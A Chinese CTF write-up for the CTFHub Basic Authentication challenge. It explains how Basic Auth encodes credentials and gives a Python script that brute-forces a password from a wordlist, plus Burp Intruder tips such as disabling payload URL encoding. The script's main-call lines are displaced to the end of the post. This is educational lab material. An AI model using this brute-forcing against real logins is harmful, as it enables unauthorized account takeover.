---
title: CTFHub HTTP协议 基础认证
date: 2026-09-23
categories: CTFHub 
tags: CTFHub HTTP协议  Base64 爆破
---
# 题目： CTFHub HTTP协议 基础认证

## 题目描述
访问页面弹出HTTP Basic Authentication认证弹窗，需要爆破账号密码获取flag。题目附件为密码字典。
 
## 解题思路
HTTP基础认证（Basic Auth），客户端将 用户名:密码 做Base64编码，放在 Authorization 请求头提交给服务器验证。

## 解题步骤
使用Python脚本爆破
1. 下载题目附件放在桌面
2. 在桌面新建文本文档命名为basic_brute.txt
3. 粘贴脚本
   import requests
from requests.auth import HTTPBasicAuth

# =========【这里改配置！】=========
url = "http://challenge-xxxx.ctfhub.com:10080/flag.html"  # 替换成你靶场的地址
username = "admin"
dict_path = "10_million_password_list_top_100.txt"  # 你的题目附件字典文件名
# =================================

def brute_basic_auth():
    with open(dict_path, "r", encoding="utf-8") as f:
        lines = f.readlines()
    print(f"[*] 加载密码总数：{len(lines)}")
    for line in lines:
        pwd = line.strip()  # 去除换行、空格
        if not pwd:
            continue
        try:
            resp = requests.get(url, auth=HTTPBasicAuth(username, pwd), timeout=3)
            # 200代表认证成功
            if resp.status_code == 200:
                print("\n✅ 找到正确密码！")
                print(f"用户名：{username}")
                print(f"密码：{pwd}")
                print(f"响应内容：\n{resp.text}")
                return
            else:
                print(f"[-] {pwd} 认证失败(401)")
        except Exception as e:
            print(f"[!] 请求异常 {pwd} : {e}")
    print("\n[!] 遍历全部字典，未找到密码！")
4. 将txt后缀修改为py
5. 打开cmd，安装依赖 pip install requests
6. 运行脚本 python basic_brute.py
7. 得出账号密码及flag、

## 踩坑指南
1. CTFHub靶场有时间限制，长时间不操作靶场失效，所有请求固定返回401，爆破前需要重启靶场。
2. Burp Intruder添加标记必须使用Burp自带 § 符号，不能手动输入字母S，否则payload无法替换。
3. Payload处理顺序：先拼接用户名，再Base64编码，顺序不能颠倒。
4. -重点坑：Burp Intruder默认开启Payload URL编码。Base64包含 = 、 + 、 / ，会被URL转义，编码串被篡改，全部认证失败。处理Base64时必须关闭Payload encoding。
5. Windows运行Python脚本时，脚本文件和字典文件放在同一目录，否则报 No such file or directory 。
6. Burp社区版爆破速度慢，字典条目较多时，容易遇到靶场超时；Python脚本无速率限制，爆破更快。
 
## 知识点总结
HTTP Basic认证：
1. 客户端将 username:password 原始字符串Base64编码
2. 请求头添加  Authorization: Basic 编码串 
3. 服务器解码，校验账号密码，成功返回200，失败返回401弹窗。

if __name__ == "__main__":
    brute_basic_auth()
